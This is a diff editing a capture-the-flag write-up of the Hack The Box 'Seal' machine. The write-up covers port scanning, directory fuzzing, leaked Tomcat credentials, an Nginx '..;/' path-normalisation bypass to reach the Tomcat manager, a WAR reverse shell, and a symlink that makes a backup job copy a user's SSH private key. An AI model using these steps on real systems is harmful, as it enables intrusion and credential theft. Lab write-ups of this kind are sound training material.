@@ -7,7 +7,7 @@
 
 
 ## Walkthrough
-The tester started by scanning the host wiht nmap.
+The tester started by scanning the host with nmap to find it services.
 
 ```
 └──╼ $nmap -p 22,443,8080 -A  10.10.10.250
@@ -47,41 +47,7 @@ PORT     STATE SERVICE    VERSION
 |     Content-Length: 0
 |   GetRequest: 
 |     HTTP/1.1 401 Unauthorized
-|     Date: Wed, 15 Nov 2023 16:21:01 GMT
-|     Set-Cookie: JSESSIONID=node01pem304tamok91y11bwkngfldv0.node0; Path=/; HttpOnly
-|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
-|     Content-Type: text/html;charset=utf-8
-|     Content-Length: 0
-|   HTTPOptions: 
-|     HTTP/1.1 200 OK
-|     Date: Wed, 15 Nov 2023 16:21:02 GMT
-|     Set-Cookie: JSESSIONID=node0ud0j695jx1901i1najvrjn7si1.node0; Path=/; HttpOnly
-|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
-|     Content-Type: text/html;charset=utf-8
-|     Allow: GET,HEAD,POST,OPTIONS
-|     Content-Length: 0
-|   RPCCheck: 
-|     HTTP/1.1 400 Illegal character OTEXT=0x80
-|     Content-Type: text/html;charset=iso-8859-1
-|     Content-Length: 71
-|     Connection: close
-|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
-|   RTSPRequest: 
-|     HTTP/1.1 505 Unknown Version
-|     Content-Type: text/html;charset=iso-8859-1
-|     Content-Length: 58
-|     Connection: close
-|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
-|   Socks4: 
-|     HTTP/1.1 400 Illegal character CNTL=0x4
-|     Content-Type: text/html;charset=iso-8859-1
-|     Content-Length: 69
-|     Connection: close
-|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
-|   Socks5: 
-|     HTTP/1.1 400 Illegal character CNTL=0x5
-|     Content-Type: text/html;charset=iso-8859-1
-|     Content-Length: 69
+<snip>
 |     Connection: close
 |_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
@@ -97,12 +63,13 @@ Port 8080 was hosting a Gitbucket instance. The Gitbucket instance is configured
 
 ![web_error](https://private-user-images.githubusercontent.com/63368388/285897564-c1728f79-769f-4086-9637-5dd27cbfa6f4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQwOTAsIm5iZiI6MTcwMTA5Mzc5MCwicGF0aCI6Ii82MzM2ODM4OC8yODU4OTc1NjQtYzE3MjhmNzktNzY5Zi00MDg2LTk2MzctNWRkMjdjYmZhNmY0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MDMxMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU1ZTA3ZTVlYTgxNDU0ZWU5NjAxMTlmNjdlYTFkMjQ0OWJmZmM1ZmMxMjJlNWJmMzY0NDQzMGUwMzAyMDAyNmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.Y-jp4piU_j45nC9xjvgutWNHJGQQOA-44QpmcSdG2lI)
 
-The tester searched the repositories and found Tomcat credentials in the 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 commit on the 5 May 2021. 
+
+The tester searched the repositories and found Tomcat credentials in the 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 commit from the 5 May 2021. 
 The tester used the ffuf tool to search for different web directories on port 443 and found the Tomcat manager directory.
 
 ```
 ┌─[rang3r@parrot]─[~/Projects/machines/seal]
-└──╼ $ffuf -w  '/home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt'    -k      -u  "https://seal.htb:443/FUZZ" -ic  
+└──╼ $ffuf -w  '/home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt' -k -u  "https://seal.htb:443/FUZZ" -ic  
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -135,14 +102,11 @@ manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30m
 :: Progress: [81630/81630] :: Job [1/1] :: 480 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
 ```
 
-Tomcat services has the "WAR file to deploy" feature to deploy .war files, which could also be used to upload a malicious payload however the directory was blocked. 
+Tomcat services has the "WAR file to deploy" feature to deploy .war files, which could also be used to upload a malicious payload, However that page was blocked. The tester was able to access it by abusing Nginx path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the desired  page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This worked to access the manager page however required more work to 
+ get the war file upload to work. The tester had to intercept the post request with burp suit and change the post URL to bypass the restriction with the double period and a semicolon, shown below. 
 
-The tester firsted created a payload using msfvenom 
-
-The tester was able to access it by abusing Nginx path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the desired  page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This worked to access the manager page however required more work to 
- get the war file upload to work. The tester had to intercept the post request with burp suite and change the post URL to the bypass the address with the double period and a semicolon, shown below.
-
-
+The tester created a payload using msfvenom.
+ 
 ![web_error](https://private-user-images.githubusercontent.com/63368388/285900777-51dad20f-c45f-4952-88dd-c7318ab0069c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQ3NTEsIm5iZiI6MTcwMTA5NDQ1MSwicGF0aCI6Ii82MzM2ODM4OC8yODU5MDA3NzctNTFkYWQyMGYtYzQ1Zi00OTUyLTg4ZGQtYzczMThhYjAwNjljLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MTQxMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEzODlmYjk5ODgzZDFmN2M4MmI1OGFiMzk2MzUzOGQyNGQ1OTc2MjJmODZhMDY0OGE0MTU5ODI5Zjk2NjE0NzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.SKic49GtzK-MompbSwuBjZ_ycukZz2iEzfQjk94QOBE)
 
 Once the malicious file was uploaded the tester navigated to https://seal.htb/revshell/ which executed the shell connecting it to the netcat listener. 
@@ -168,7 +132,7 @@ seal
 tomcat@seal:/var/lib/tomcat9$ 
 ```
 
-The tester used the "pspy" tool to monitor the system processes and found that the "luis" account would periodically run ansible to backup the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory to the /opt/backups/files/directory. 
+The tester used the "[pspy](https://github.com/DominicBreuker/pspy)" tool to monitor the system processes and found that the "luis" account would periodically run ansible to backup the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory to the /opt/backups/files/directory. 
 
 ```
 tomcat@seal:/tmp$ ./pspy64 
@@ -215,7 +179,7 @@ tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
       path: /opt/backups/files/
 ```
 
-The Tomcat user has write access to the upload subdirectory in the dashboard filesystem. The tester was able to create a file in the upload dircetory which was linked to the SSH private key of the "luis" account. The tester used the below command, in the upload directory, to create the link. 
+The Tomcat user had write access to the upload subdirectory in the dashboard filesystem. The tester was able to create a file in the upload dircetory which was linked to the SSH private key of the "luis" account. The tester used the below command, in the upload directory, to create the link. 
 
 ```
 ln -s /home/luis/.ssh/id_rsa id_rsa
